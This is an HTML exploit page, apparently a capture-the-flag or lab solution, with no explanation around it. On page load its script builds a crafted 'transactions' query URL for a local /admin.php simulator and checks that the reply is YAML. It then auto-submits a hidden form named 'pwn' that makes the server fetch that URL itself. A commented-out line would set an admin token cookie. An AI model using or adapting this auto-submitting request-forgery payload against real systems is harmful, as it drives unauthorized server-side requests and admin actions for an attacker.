<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Autosubmit → /admin.php (with debug)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
</head>
<body>
  <!-- If you're NOT on 127.0.0.1, and you know ADMIN_TOKEN, uncomment: -->
  <!-- <script>document.cookie = "token=PUT_ADMIN_TOKEN_HERE; path=/;";</script> -->

  <form id="pwn" method="POST" action="http://localhost:5000/admin.php">
    <input type="hidden" name="url" id="urlField" value="">
  </form>

  <script>
    (async function () {
      // Build the simulator GET URL exactly as the server expects
      const params = new URLSearchParams();
      params.set("transactions[0][amount]", "1");
      params.set("transactions[0][country]", "United States");
      params.set("transactions[1][amount]", "1");
      params.set("transactions[1][country]", "United States");

      const simUrl = "http://localhost:5000/admin.php?" + params.toString();
      console.log("Simulator URL:", simUrl);

      // (Optional but very useful) Fetch the simulator output first to confirm it's valid YAML
      try {
        const res = await fetch(simUrl, { method: "GET" });
        const txt = await res.text();
        console.log("Simulator response:\n" + txt);

        // Quick sanity check: must start with "- amount:" or it’s not YAML
        if (!/^- amount:/m.test(txt)) {
          alert("Simulator did not return YAML.\nCheck console output for the error text.\nFix GET first, then try again.");
          return;
        }
      } catch (e) {
        console.error("Failed to fetch simulator URL from the browser:", e);
        // Even if the browser can’t fetch (CORS, etc.), the server will fetch it server-side.
        // We'll still proceed to POST.
      }

      // Put the URL into the POST form and submit
      document.getElementById("urlField").value = simUrl;
      document.getElementById("pwn").submit();
    })();
  </script>
</body>
</html>
